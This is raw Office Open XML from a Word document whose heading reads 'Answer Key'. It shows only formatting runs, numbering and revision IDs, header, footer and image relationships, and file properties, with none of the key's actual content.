                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="-1"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>n</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t xml:space="preserve">swer </w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:spacing w:val="-1"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>K</w:t>
                </w:r>
                <w:r>
                  <w:rPr>
                    <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
                    <w:color w:val="A4634E"/>
                    <w:sz w:val="40"/>
                    <w:szCs w:val="40"/>
                  </w:rPr>
                  <w:t>ey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3372D4"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9F68F514"/>
    <w:lvl w:ilvl="0" w:tplc="D5E684F2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50A47C11"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CCA8CAA4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78E9"/>
    <w:rsid w:val="000F7A40"/>
    <w:rsid w:val="0017251C"/>
    <w:rsid w:val="0020708D"/>
    <w:rsid w:val="002B4F4A"/>
    <w:rsid w:val="002C13AB"/>
    <w:rsid w:val="002E1077"/>
    <w:rsid w:val="00331A31"/>
    <w:rsid w:val="00397242"/>
    <w:rsid w:val="00435388"/>
    <w:rsid w:val="00472E60"/>
    <w:rsid w:val="0051062B"/>
    <w:rsid w:val="00600AB3"/>
    <w:rsid w:val="00601D3F"/>
    <w:rsid w:val="007259DA"/>
    <w:rsid w:val="00732A9A"/>
    <w:rsid w:val="00762AE6"/>
    <w:rsid w:val="007B3087"/>
    <w:rsid w:val="007B7C2B"/>
    <w:rsid w:val="007E05B1"/>
    <w:rsid w:val="007E35E5"/>
    <w:rsid w:val="008100B5"/>
    <w:rsid w:val="0094573D"/>
    <w:rsid w:val="009A7B07"/>
    <w:rsid w:val="009B0B5F"/>
    <w:rsid w:val="00A76861"/>
    <w:rsid w:val="00A86C10"/>
    <w:rsid w:val="00BE01E5"/>
    <w:rsid w:val="00CF78E9"/>
    <w:rsid w:val="00DA27AD"/>
    <w:rsid w:val="00EC54F0"/>
    <w:rsid w:val="00EC6173"/>
    <w:rsid w:val="00F44384"/>
    <w:rsid w:val="00FA45BE"/>
    <w:rsid w:val="00FA5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4"/>
    <o:shapelayout v:ext="edit">
      <o:idmap v:ext="edit" data="1"/>
    </o:shapelayout>
  </w:shapeDefaults>
  <w:decimalSymbol w:val="."/>
  <w:listSeparator w:val=","/>
  <w14:docId w14:val="59AE6DFB"/>
  <w15:docId w15:val="{3D2B22BC-099A-4920-AD31-6BAC0BC6E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ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="002070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1.jpeg"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header3.xml"/><Relationship Id="rId39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34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header7.xml"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header10.xml"/><Relationship Id="rId47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jpeg"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image15.jpeg"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:deanna@172.31.1.14" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header9.xml"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer5.xml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2.jpeg"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header5.xml"/><Relationship Id="rId41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2.xml"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image17.jpeg"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header8.xml"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image20.png"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header12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4.jpeg"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image16.jpeg"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image18.jpeg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31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header6.xml"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2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Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.png"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header4.xml"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer3.xml"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer" Target="footer4.xml"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header11.xml"/><Relationship Id="rId48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358</TotalTime>
  <Pages>35</Pages>
  <Words>6203</Words>
  <Characters>35358</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>294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21</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-05-23T17:39:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-26T18:52:00Z</dcterms:modified>
</cp:coreProperties>
</file>